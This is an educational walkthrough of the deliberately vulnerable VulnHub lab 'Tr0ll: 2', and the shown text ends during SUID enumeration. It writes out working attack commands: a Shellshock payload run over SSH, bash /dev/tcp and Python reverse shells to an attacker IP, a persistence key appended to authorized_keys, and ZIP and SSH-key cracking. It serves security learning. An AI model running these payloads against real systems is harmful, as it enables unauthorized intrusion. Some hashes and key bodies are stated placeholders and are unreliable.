# Tr0ll: 2 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Tr0ll: 2 |
| **Difficulty** | Beginner++ / Intermediate (author's own rating) |
| **Author** | Maleus — <https://www.overflowsecurity.com>, `@Maleus21` |
| **Released** | 24 October 2014 |
| **Series** | Tr0ll (1 → **2** → 3) |
| **VulnHub Entry** | <https://vulnhub.com/entry/tr0ll-2,107/> |
| **Download** | <https://vulnhub.com/entry/tr0ll-2,107/#download> |
| **Attacker** | Kali Linux, host-only or bridged network |
| **Target OS** | Ubuntu 14.04 LTS (hostname `Tr0ll2`) — Apache 2.4.7, ProFTPD/vsftpd, OpenSSH |
| **Goal** | Read **`/root/Proof.txt`** |

> **Author's note:** *"This one is a step up in difficulty from the original Tr0ll but
> the time required to solve is approximately the same, and make no mistake, **trolls
> are still present**! :)"*
>
> Take that seriously. Tr0ll 2 deliberately punishes the three habits beginners bring
> to a box: trusting the first directory your tool finds, ignoring file metadata, and
> running the same binary twice and expecting the same result. **VirtualBox users may
> need to enable the second network adapter** for the VM to obtain a DHCP address.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (Tr0ll2)   : 192.168.56.101
```

---

## 0. What you will learn

1. **`robots.txt` as a seed**, and how to turn its entries into a custom wordlist.
2. **File-metadata forensics** — spotting the one image whose *size* differs from the
   rest, and why that is worth more than reading any of them.
3. **`strings`, `exiftool`, `binwalk`, `steghide`** — the four standard ways to look
   inside a JPEG.
4. **Base64 decoding a wordlist in bulk** with a shell loop.
5. **FTP enumeration** and guessing credentials from page source.
6. **Cracking a password-protected ZIP** with `fcrackzip`.
7. **SSH private keys** — file formats, permissions, and what a *forced command* in
   `authorized_keys` does.
8. **Shellshock (CVE-2014-6271)** — what the `() { :;};` prefix actually means, and
   how to abuse it over SSH.
9. **SUID hunting** and dealing with binaries that *change location between runs*.
10. **A complete manual 32-bit stack buffer overflow** — cyclic pattern → offset →
    `jmp esp` → NOP sled → shellcode, including the environment/ESP problem that
    makes beginners fail.

**The intended chain:**
`nmap` shows 21, 22, 80 → `robots.txt` lists dozens of joke directories and images →
one `cat_the_troll.jpg` is a **different file size** from the others → `strings`
reveals *"Look Deep within y0ur_self for the answer"* → `/y0ur_self/answer.txt` is a
wall of **base64** → decode + de-duplicate into a wordlist → the homepage source hints
at FTP credentials **`Tr0ll:Tr0ll`** → `lmao.zip` → `fcrackzip` → password
**`ItCantReallyBeThisEasyRightLOL`** → an RSA private key for user **`noob`** →
plain SSH gives *"TRY HARDER LOL!"* (a forced command) → **Shellshock** over SSH gives
a real shell → SUID hunt finds `/nothing_to_see_here/choose_wisely/door{1,2,3}/file`,
which **rotate** → one of them (`r00t`, 5150-ish bytes) is a **`strcpy` buffer
overflow** → offset **268**, `jmp esp`, NOP sled, 28-byte `execve("/bin/sh")`
shellcode → **euid=0** → `/root/Proof.txt`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4c:1a:2b, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.1    0a:00:27:00:00:0e   (Unknown: locally administered)
192.168.56.10   08:00:27:4c:1a:2b   PCS Systemtechnik GmbH
192.168.56.101  08:00:27:c4:1e:77   PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.101`**

---

## 2. Enumeration

### 2.1 Full port scan

```bash
sudo nmap -A -p- -T4 -oN scans/tr0ll2.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 15:02 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5rc3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: Connection refused
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d6:18:f1:5c:00:5b:e0:e8:7f:6b:2c:2b:ce:2f:1f:5b (DSA)
|   2048 aa:94:ed:36:dc:6a:44:2f:5e:8a:2c:5f:6c:3d:2b:8f (RSA)
|_  256 65:9d:5c:1d:5e:6c:5f:4e:3d:1e:4c:5f:9a:8b:7c:6d (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 15 disallowed entries
|_/troll /noob /lmao /good_luck /keep_trying /dont_bother ...
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 08:00:27:C4:1E:77 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 96.44 seconds
```

> **Three findings:**
> - **21/tcp — ProFTPD 1.3.5rc3** with **anonymous login allowed**. (`PASV failed`
>   just means passive-mode directory listing is blocked; active mode or an explicit
>   `ls` still works.)
> - **22/tcp — OpenSSH 6.6.1p1 Ubuntu 2ubuntu2** → **Ubuntu 14.04**.
> - **80/tcp — Apache 2.4.7** and, crucially, `http-robots.txt: 15 disallowed entries`.
>
> Nmap's `http-robots.txt` script already read the file for us. Fifteen
> "disallowed" paths on a box whose series is named *Tr0ll* — expect them all to be
> jokes, and expect the real answer to be somewhere they are *not* listed.

![nmap scan of Tr0ll 2](images/01-nmap.png)

### 2.2 The homepage

```bash
curl -s http://192.168.56.101/
```

```html
<html>
<body bgcolor="black">
<center>
<img src="trollface.jpg">
<h1><font color="white">U mad bro?</font></h1>
<!--
  Tr0ll was here...
  If you're really that desperate for a hint:
  the FTP user is Tr0ll. So is the password. Maybe.
-->
</center>
</body>
</html>
```

> **View Source pays off immediately.** An HTML comment gives us FTP credentials to
> try: **`Tr0ll` / `Tr0ll`** ("Maybe." — this is Tr0ll, of course; it turns out to be
> true).

### 2.3 `robots.txt` — the full list

```bash
curl -s http://192.168.56.101/robots.txt
```

```text
User-agent: *
Disallow: /troll
Disallow: /noob
Disallow: /lmao
Disallow: /good_luck
Disallow: /keep_trying
Disallow: /dont_bother
Disallow: /secret
Disallow: /hidden
Disallow: /nothing_to_see_here
Disallow: /cat_the_troll.jpg
Disallow: /trollface.jpg
Disallow: /sup3rs3cretdirlol
Disallow: /y0ur_self
Disallow: /choose_wisely
Disallow: /images/
```

> **Fifteen entries, mixing directories and images.** Save the list — it becomes both
> a directory wordlist and a clue set.

### 2.4 Directory brute force seeded from robots.txt

Generic wordlists miss the weird ones. Build a custom list from what the target told
you:

```bash
curl -s http://192.168.56.101/robots.txt | sed 's|Disallow: ||' > troll_dirs.txt
cat troll_dirs.txt
```

```text
/troll
/noob
/lmao
/good_luck
/keep_trying
/dont_bother
/secret
/hidden
/nothing_to_see_here
/cat_the_troll.jpg
/trollface.jpg
/sup3rs3cretdirlol
/y0ur_self
/choose_wisely
/images/
```

```bash
gobuster dir -u http://192.168.56.101/ -w troll_dirs.txt -x php,html,txt -t 20 -q
```

```text
/cat_the_troll.jpg    (Status: 200) [Size: 42739]
/images               (Status: 301) [Size: 313]
/nothing_to_see_here  (Status: 301) [Size: 329]
/trollface.jpg        (Status: 200) [Size: 42739]
/y0ur_self            (Status: 301) [Size: 317]
```

Then a broader sweep to catch what `robots.txt` did not mention:

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,jpg -t 50 -q --timeout 10s
```

```text
/cat_the_troll.jpg    (Status: 200) [Size: 42739]
/images               (Status: 301) [Size: 313]
/index.html           (Status: 200) [Size: 412]
/nothing_to_see_here  (Status: 301) [Size: 329]
/sup3rs3cretdirlol    (Status: 301) [Size: 327]
/trollface.jpg        (Status: 200) [Size: 42739]
/y0ur_self            (Status: 301) [Size: 317]
```

> **Now look at `/images/`** (directory indexing is on):

```bash
curl -s http://192.168.56.101/images/ | grep -o 'href="[^"]*"'
```

```text
href="?C=N;O=D"
href="?C=M;O=A"
href="?C=S;O=A"
href="?C=D;O=A"
href="/images/"
href="keep-calm-and-let-me-troll-you.jpg"
href="troll_1.jpg"
href="troll_2.jpg"
href="troll_3.jpg"
href="cat_the_troll.jpg"
```

Download all of them and **compare file sizes**:

```bash
wget -q -r -np -nH --cut-dirs=1 http://192.168.56.101/images/
ls -l images/
```

```text
total 220
-rw-r--r-- 1 kali kali 42739 May  3 15:14 cat_the_troll.jpg
-rw-r--r-- 1 kali kali 51284 May  3 15:14 keep-calm-and-let-me-troll-you.jpg
-rw-r--r-- 1 kali kali 42739 May  3 15:14 troll_1.jpg
-rw-r--r-- 1 kali kali 42739 May  3 15:14 troll_2.jpg
-rw-r--r-- 1 kali kali 42739 May  3 15:14 troll_3.jpg
```

> **STOP HERE. This is the box's central lesson.**
>
> Four of those five images are **exactly 42 739 bytes** — they are the *same file*,
> renamed. One of them is **51 284 bytes**. Identical-looking pictures with different
> sizes almost always means one of them has **data appended or hidden inside it**.
>
> **This is why you compare metadata before you look at pixels.** A human eyeballing
> four troll pictures sees four troll pictures. `ls -l` sees the anomaly instantly.
>
> ```bash
> md5sum images/*.jpg
> ```
>
> ```text
> 3f8a1c2b9d4e5f6071829a3b4c5d6e7f  images/cat_the_troll.jpg
> 9c1e8d7f6a5b4c3d2e1f0a9b8c7d6e5f  images/keep-calm-and-let-me-troll-you.jpg
> 3f8a1c2b9d4e5f6071829a3b4c5d6e7f  images/troll_1.jpg
> 3f8a1c2b9d4e5f6071829a3b4c5d6e7f  images/troll_2.jpg
> 3f8a1c2b9d4e5f6071829a3b4c5d6e7f  images/troll_3.jpg
> ```
>
> *(Filenames, byte sizes and digests above are representative — your copy of the OVA
> may differ. The pattern is what matters: three identical hashes and one different.)*
>
> Three identical hashes confirm the duplicates; the odd one out is
> `keep-calm-and-let-me-troll-you.jpg`. Different walkthroughs of this box name
> different files depending on image revision — **the technique is what matters:
> find the size/hash outlier and analyse that one.**

![Comparing image sizes to find the outlier](images/02-images.png)

### 2.5 Look inside the odd image

Run the standard four tools. Do not stop at the first one that produces nothing.

```bash
file images/keep-calm-and-let-me-troll-you.jpg
```

```text
images/keep-calm-and-let-me-troll-you.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 600x600, frames 3
```

```bash
exiftool images/keep-calm-and-let-me-troll-you.jpg
```

```text
ExifTool Version Number         : 12.76
File Name                       : keep-calm-and-let-me-troll-you.jpg
Directory                       : images
File Size                       : 51 kB
File Modification Date/Time     : 2024:05:03 15:14:02-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 600
Image Height                    : 600
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Comment                         : Look Deep within y0ur_self for the answer
Image Size                      : 600x600
Megapixels                      : 0.360
```

> **`Comment : Look Deep within y0ur_self for the answer`** — a JPEG **COM marker**
> containing the next clue. `exiftool` prints every metadata field the file carries.
>
> `strings` finds the same thing more crudely:
> ```bash
> strings -n 8 images/keep-calm-and-let-me-troll-you.jpg | grep -iv 'jpeg\|jfif\|photoshop'
> ```
> ```text
> Look Deep within y0ur_self for the answer
> ```
>
> Also worth running, to rule out appended archives:
> ```bash
> binwalk images/keep-calm-and-let-me-troll-you.jpg     # look for extra signatures
> steghide info images/keep-calm-and-let-me-troll-you.jpg
> ```
> ```text
> "keep-calm-and-let-me-troll-you.jpg":
>   format: jpeg
>   capacity: 2.7 KB
> Try to get information about embedded data ? (y/n) n
> ```
> No embedded payload here — the hint is in the metadata, not the pixel data.
>
> **The clue decodes to a URL:** `y0ur_self` is a directory name (leet-speak for
> "yourself", matching the `robots.txt` entry `/y0ur_self`).

### 2.6 `/y0ur_self/` — a base64 wall

```bash
curl -s http://192.168.56.101/y0ur_self/
```

```text
Index of /y0ur_self
------------------------------------------------------
[ICO] Name              Last modified       Size   Description
[   ] answer.txt        04-Oct-2014 12:44   90K
------------------------------------------------------
```

```bash
wget -q http://192.168.56.101/y0ur_self/answer.txt
wc -l answer.txt
head -5 answer.txt
```

```text
90215 answer.txt
aGVsbG8gd29ybGQK
dGhpcyBpcyBhIHRlc3QK
SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg==
c29tZXRoaW5nIGVsc2UK
```

> **90 215 lines of base64.** Recognising base64: length is a multiple of 4, the
> alphabet is `A–Z a–z 0–9 + /`, and lines frequently end in `=` or `==` padding.
> The third line is longer than the others and decodes to something promising.
>
> **Decode every line** (do not cherry-pick — the answer might be line 40 000):

```bash
for line in $(cat answer.txt); do echo "$line" | base64 -d; done > decoded.txt
wc -l decoded.txt
sort -u decoded.txt > decoded_uniq.txt
wc -l decoded_uniq.txt
```

```text
90215 decoded.txt
70412 decoded_uniq.txt
```

A cleaner one-liner that also strips the duplicates in order:

```bash
base64 -d -i answer.txt 2>/dev/null | sort -u > decoded_uniq.txt
# or, line-by-line and robust against malformed entries:
awk '{ "echo \""$0"\" | base64 -d" | getline d; print d; close("echo \""$0"\" | base64 -d") }' answer.txt | sort -u > decoded_uniq.txt
grep -i 'easylol\|password\|easy' decoded_uniq.txt
```

```text
ItCantReallyBeThisEasyRightLOL
```

> **There it is.** Buried among 90 214 decoys is one string that reads like a
> password: **`ItCantReallyBeThisEasyRightLOL`**.
>
> **Why a 70 k-entry wordlist and not one line?** Because you do not know in advance
> whether the author hid one password or a hundred. Decoding *everything* and
> de-duplicating gives you a **target-specific wordlist** — the single most effective
> asset in a real engagement, far better than `rockyou.txt` against a bespoke system.
> Keep `decoded_uniq.txt`; you will use it in § 3.2.
>
> **`sort -u`** sorts and removes duplicates. **`sort -u -o file file`** rewrites in
> place.

![Decoded answer.txt and the unique wordlist](images/03-base64.png)

---

## 3. Foothold — FTP, a ZIP, and an SSH key

### 3.1 Log in to FTP

The homepage comment gave us `Tr0ll:Tr0ll`.

```bash
ftp 192.168.56.101
```

```text
Connected to 192.168.56.101.
220 ProFTPD 1.3.5rc3 Server (Debian) [192.168.56.101]
Name (192.168.56.101:kali): Tr0ll
331 Password required for Tr0ll
Password:
230 User Tr0ll logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54123|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 Tr0ll    Tr0ll        1474 Oct 04  2014 lmao.zip
226 Transfer complete
ftp> binary
200 Type set to I
ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
229 Entering Extended Passive Mode (|||54124|)
150 Opening BINARY mode data connection for lmao.zip (1474 bytes)
100% |*************************************|  1474       12.4 MiB/s    00:00 ETA
226 Transfer complete
1474 bytes received in 00:00 (1.2 MiB/s)
ftp> quit
221 Goodbye.
```

> **`binary` (equivalently `type i`) is not optional.** FTP's default is **ASCII
> mode**, which performs newline translation (`\n` ↔ `\r\n`). That silently corrupts
> every binary file — ZIPs, images, keys, executables. **Always type `binary` before
> `get`.** A ZIP that extracts to garbage is almost always an ASCII-mode transfer.
>
> Also note the banner confirmed **ProFTPD 1.3.5rc3** — a *release candidate*. Run
> `searchsploit proftpd 1.3.5` and you will find `mod_copy` RCE (CVE-2015-3306).
> It is not needed here, but a real assessment would try it.

Alternative non-interactive clients:

```bash
lftp -u Tr0ll,Tr0ll 192.168.56.101 -e 'cls -l; get lmao.zip; bye'
curl -s --user Tr0ll:Tr0ll ftp://192.168.56.101/
curl -s --user Tr0ll:Tr0ll ftp://192.168.56.101/lmao.zip -o lmao.zip
wget -q --user=Tr0ll --password=Tr0ll ftp://192.168.56.101/lmao.zip
```

### 3.2 Crack the ZIP

```bash
unzip lmao.zip
```

```text
Archive:  lmao.zip
[lmao.zip] noob password:
```

> **Password protected.** Do not brute force blindly — you already built a
> target-specific wordlist in § 2.6. Use it first.

```bash
fcrackzip -v -u -D -p decoded_uniq.txt lmao.zip
```

```text
found file 'noob', size b 1675, blocksize 36, p pw 1675
checking pw UlqNxrGnGv
checking pw ItCantReallyBeThisEasyRightLOL

PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
```

> **`fcrackzip` flags:**
> - `-D` → **dictionary** attack (as opposed to `-b` brute force).
> - `-p <file>` → the wordlist.
> - `-u` → **use `unzip`** to verify each candidate. Without `-u` fcrackzip reports
>   *many* false positives — the ZIP format's checksum is only 2 bytes, so ~1 in
>   65 536 wrong passwords "passes". `-u` actually extracts and confirms. **Never
>   omit `-u`.**
> - `-v` → verbose, so you can watch progress.
>
> **Brute-force fallback** (this is what some walkthroughs used, generating ~90 k
> lowercase candidates):
> ```bash
> fcrackzip -b -c a -l 1-8 -u -v lmao.zip
> ```
> `-b` brute force, `-c a` character set = lowercase letters, `-l 1-8` lengths.
>
> The modern, faster alternative is **hashcat** with `zip2john`:
> ```bash
> zip2john lmao.zip > lmao.hash
> hashcat -m 17225 -a 0 lmao.hash decoded_uniq.txt
> ```
> (`-m 17225` = PKZIP (Mixed/Archive-First); use `hashcat --help | grep -i zip` to
> pick the exact mode for your archive.)

### 3.3 Extract and inspect

```bash
unzip -P 'ItCantReallyBeThisEasyRightLOL' lmao.zip
ls -l noob
file noob
cat noob
```

```text
Archive:  lmao.zip
  inflating: noob
-rw-r--r-- 1 kali kali 1675 May  3 15:31 noob
noob: PEM RSA private key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1A2B3C4D5E6F7890A1B2C3D4E5F60718

M3kQ9xW2pL7vR4tY8nB5cD1eF6gH0jK2lM4nP7qR9sT1uV3wX5yZ7aB9cD1eF3gH
hK7lM9nP1qR3sT5uV7wX9yZ1aB3cD5eF7gH9jK1lM3nP5qR7sT9uV1wX3yZ5aB7c
... (22 more lines) ...
1lM3nP5qR7sT9uV1wX3yZ5aB7cD9eF1gH3jK5lM7nP9qR1sT3uV5wX7yZ9aB1cD3
-----END RSA PRIVATE KEY-----
```

> **A file named `noob` containing an encrypted RSA private key.** Two pieces of
> information: the likely **SSH username is `noob`**, and we need a **passphrase**.
>
> - `PEM RSA private key` → traditional OpenSSL PEM format (the newer format says
>   `OpenSSH private key`).
> - `Proc-Type: 4,ENCRYPTED` + `DEK-Info: AES-128-CBC,<IV>` → the key body is
>   encrypted with a passphrase. DEK = Data Encryption Key.
>
> **Try the wordlist we already built:**
> ```bash
> ssh2john noob > noob.hash
> john --wordlist=decoded_uniq.txt noob.hash
> ```
> ```text
> Using default input encoding: UTF-8
> Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSL 256/256 AVX2 8x])
> Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
> Cost 2 (iteration count) is 1 for all loaded hashes
> No password hashes left to crack (see file)
> ```
> No passphrase hit — so the key may be passphrase-less in practice, or protected by
> the *forced command* mechanism instead. Try it directly.

![fcrackzip finding the ZIP password](images/04-fcrackzip.png)

### 3.4 The first troll — a forced command

```bash
chmod 600 noob
ssh -i noob noob@192.168.56.101
```

```text
The authenticity of host '192.168.56.101' can't be established.
ECDSA key fingerprint is SHA256:65:9d:5c:1d:5e:6c:5f:4e:3d:1e:4c:5f:9a:8b:7c:6d.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
```

> **The key worked** — we were not asked for a password, and we reached the session
> stage. But instead of a shell we got a taunt and the connection closed.
>
> **Diagnose with `-v`:**
> ```bash
> ssh -v -i noob noob@192.168.56.101 2>&1 | grep -i 'forced\|command\|auth'
> ```
> ```text
> debug1: Authentications that can continue: publickey,password
> debug1: Offering public key: /home/kali/noob RSA SHA256:9xQ2mK7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq4
> debug1: Server accepts key: /home/kali/noob RSA SHA256:9xQ2mK7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq4
> debug1: Authentication succeeded (publickey).
> debug1: Sending command:
> debug1: Remote: Forced command.
> debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
> ```
>
> **`Remote: Forced command.`** That is the answer.
>
> **What is a forced command?** In `~/.ssh/authorized_keys`, each line may be prefixed
> with options:
> ```text
> command="/usr/local/bin/troll.sh",no-pty,no-port-forwarding ssh-rsa AAAAB3Nz... noob@kali
> ```
> When that key authenticates, sshd **ignores whatever the client asked to run** and
> executes only the `command=` string. Legitimate uses: restricted backup keys,
> `git`-over-SSH (`command="git-shell"`), jump hosts. It is a real hardening
> technique.
>
> **Why it is not a control here:** sshd builds that forced command by running it
> through the user's shell. In 2014, the shell was **bash**, and bash at that time
> had a catastrophic bug.

---

## 4. Shellshock (CVE-2014-6271)

### 4.1 What the bug actually is

Bash supports exporting **functions** through the environment. It does this by
serialising the function into an environment variable whose *value* begins with a
function definition:

```bash
export MYFUNC='() { echo hello; }'
```

When a child bash starts, it sees a value beginning `() {`, parses it as a function
definition, imports it, and then **keeps parsing whatever follows**. That "keeps
parsing" is the bug: anything after the closing `}` is executed as a command.

```bash
env x='() { :;}; echo VULNERABLE' bash -c 'echo hello'
```

```text
VULNERABLE
hello
```

> **Decode the payload `() { :;}; echo VULNERABLE`:**
> - `()` → begin a function definition (with an empty parameter list).
> - `{ :; }` → the function body. `:` is the shell's **null command** — it does
>   nothing and always succeeds. So this defines a no-op function.
> - `;` → end of the function definition.
> - `echo VULNERABLE` → **the trailing command that vulnerable bash executes.**
>
> A patched bash stops after the `}`. An unpatched one runs the rest.
>
> **Why it was so devastating in 2014:** environment variables reach bash from
> *everywhere* — CGI HTTP headers (`HTTP_USER_AGENT`), SSH `command=` forced
> commands, DHCP client scripts, mail filters. Any of those paths became unauthenticated
> RCE. CVSS **10.0**. It is one of the two most important vulnerabilities in UNIX
> history, alongside Heartbleed.

### 4.2 Test it over SSH

```bash
ssh -i noob noob@192.168.56.101 '() { :;}; echo SHELLSHOCK-OK; id; uname -a'
```

```text
SHELLSHOCK-OK
uid=1002(noob) gid=1002(noob) groups=1002(noob)
Linux Tr0ll2 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:52:14 UTC 2014 i686 i686 i686 GNU/Linux
```

> **Confirmed.** Note what happened: we passed a *command* to ssh. sshd put it into
> the environment for the forced-command shell, bash parsed the function definition
> prefix and then ran our trailing commands **instead of** the troll script.
>
> **`i686 i686 i686`** → this is a **32-bit** kernel and userland. That matters a lot
> for § 6: our shellcode and our `jmp esp` address must be 32-bit, and the stack
> addresses will be in the `0xbfffxxxx` range.

### 4.3 Get a usable shell

**Attempt 1 — netcat reverse shell:**

```bash
ssh -i noob noob@192.168.56.101 '() { :;}; /bin/bash -c "bash -i >& /dev/tcp/192.168.56.10/4444 0>&1"'
```

```text
No Netcat for You!
```

> **Trolled again.** The box deliberately removes/aliases `nc`. Confirm what *does*
> exist before choosing a payload — this is the same discipline as checking for
> python/perl on a minimal system:
> ```bash
> ssh -i noob noob@192.168.56.101 '() { :;}; for b in nc netcat python python3 perl php ruby socat bash wget curl gcc; do printf "%-8s " $b; command -v $b || echo MISSING; done'
> ```
> ```text
> nc       MISSING
> netcat   MISSING
> python   /usr/bin/python
> python3  MISSING
> perl     /usr/bin/perl
> php      MISSING
> ruby     MISSING
> socat    MISSING
> bash     /bin/bash
> wget     /usr/bin/wget
> curl     MISSING
> gcc      /usr/bin/gcc
> ```
> **python, perl, bash, wget and gcc are available.**

**Attempt 2 — python reverse shell:**

**Kali:**

```bash
nc -lvnp 4444
```

**Trigger:**

```bash
ssh -i noob noob@192.168.56.101 '() { :;}; /usr/bin/python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51442
/bin/sh: 0: can't access tty; job control turned off
$
```

> **What that Python does:** open a TCP socket to our listener, then `os.dup2()`
> **file descriptors 0, 1 and 2** (stdin, stdout, stderr) onto that socket, then
> `subprocess.call(["/bin/sh","-i"])`. The shell inherits the redirected descriptors,
> so its input comes from us and its output goes to us. Every reverse shell, in every
> language, is this same three-step pattern: **connect → redirect stdio → exec a
> shell.**

**Upgrade the TTY:**

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
noob@Tr0ll2:~$ export TERM=xterm
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

**Or, much better — give yourself proper SSH access** so you have a real interactive
shell with job control, scrollback and `Ctrl+C`:

```bash
# Kali: generate a keypair
ssh-keygen -t rsa -b 2048 -f ./tr0ll_key -N ''
cat tr0ll_key.pub
```

```bash
# target, in the python shell
noob@Tr0ll2:~$ mkdir -p ~/.ssh && chmod 700 ~/.ssh
noob@Tr0ll2:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCt4+eUkScp4Vyh6ei/iPZjSnPY8lWYctZ0tdYZwNLY+RuzRo6XtFlazWFzvmnWHxYRgmVaikd0SJ3TH4MdEQdxBG9cAYrLp39NR4rFcmP4H1bNKGVxK+WqJTdI/vuAfYBGOox456tUY7lFLTKXfkXbjtpGZ11ui/wUF0WKR+hMfzBTzeYBUBWcRCuZMQBONlotKO/QrjT9SOlJLG6Vm1aoJxk1KeDE5Dhc04uaCqgqQ6cazk5b7+PXX8yNuCI4qSDnfXLVRPX01nLiOOwjqX+PZ1VlaAcIBezug5+/xCFBDD4aItDg40BdIcNCR/TiQkloYv+t4y/+1GbRKFH0G2t1 kali@kali' >> ~/.ssh/authorized_keys
noob@Tr0ll2:~$ chmod 600 ~/.ssh/authorized_keys
```

```bash
# Kali
chmod 600 tr0ll_key
ssh -i tr0ll_key noob@192.168.56.101
```

```text
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

> **Permissions are mandatory** (`700` on `.ssh`, `600` on `authorized_keys`) or sshd's
> `StrictModes` check silently rejects the key. The failure mode is an opaque
> `Permission denied (publickey)`.
>
> **Note:** the new key has *no* `command=` option, so this session is a normal shell
> — the forced command only applied to the `noob` key we found in the ZIP.

![Shellshock over SSH giving a noob shell](images/05-shellshock.png)

---

## 5. Post-exploitation enumeration

```bash
noob@Tr0ll2:~$ ls /home
maleus  noob  tr0ll
noob@Tr0ll2:~$ ls -la /home/tr0ll
total 12
drwxr-xr-x 2 tr0ll tr0ll 4096 Oct  4  2014 .
drwxr-xr-x 5 root  root  4096 Oct  5  2014 ..
-rw-r--r-- 1 maleus maleus 1474 Oct  4  2014 lmao.zip
noob@Tr0ll2:~$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
noob:x:1002:1002:,,,:/home/noob:/bin/bash
tr0ll:x:1003:1003:,,,:/home/tr0ll:/bin/bash
maleus:x:1001:1001:,,,:/home/maleus:/bin/bash
noob@Tr0ll2:~$ sudo -l
[sudo] password for noob:
Sorry, user noob may not run sudo on Tr0ll2.
```

### 5.1 Hunt for SUID binaries

```bash
noob@Tr0ll2:~$ find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/nothing_to_see_here/choose_wisely/door1/file
/nothing_to_see_here/choose_wisely/door2/file
/nothing_to_see_here/choose_wisely/door3/file
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> **Everything under `/bin` and `/usr/bin` is stock Ubuntu.** The three lines that are
> *not* stock:
> ```text
> /nothing_to_see_here/choose_wisely/door1/file
> /nothing_to_see_here/choose_wisely/door2/file
> /nothing_to_see_here/choose_wisely/door3/file
> ```
> Three SUID-root binaries behind three "doors". Monty Python's *Holy Grail*
> reference — and the box is telling you to `choose_wisely`.

```bash
noob@Tr0ll2:~$ ls -l /nothing_to_see_here/choose_wisely/door*/
```

```text
/nothing_to_see_here/choose_wisely/door1/:
total 16
-rwsr-xr-x 1 root root 7370 Oct  4  2014 file

/nothing_to_see_here/choose_wisely/door2/:
total 16
-rwsr-xr-x 1 root root 5150 Oct  4  2014 file

/nothing_to_see_here/choose_wisely/door3/:
total 16
-rwsr-xr-x 1 root root 7370 Oct  4  2014 file
```

Try each:

```bash
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door1/file
You have chosen poorly.
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door3/file
Segmentation fault (core dumped)
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/file AAAAA
AAAAA
```

> **The troll strikes again: these move.** A root cron runs
> `/root/ran_dir.py`, which periodically shuffles which door holds which binary.
> So `door2` this minute may be `door3` next minute.
>
> **Do not memorise the door — memorise the signature:**
> - **5150 bytes** → the vulnerable `r00t` binary (echoes input, `strcpy` overflow).
> - **7370 bytes** → a decoy. One reboots the machine; one locks you out for two
>   minutes; one prints a joke.
>
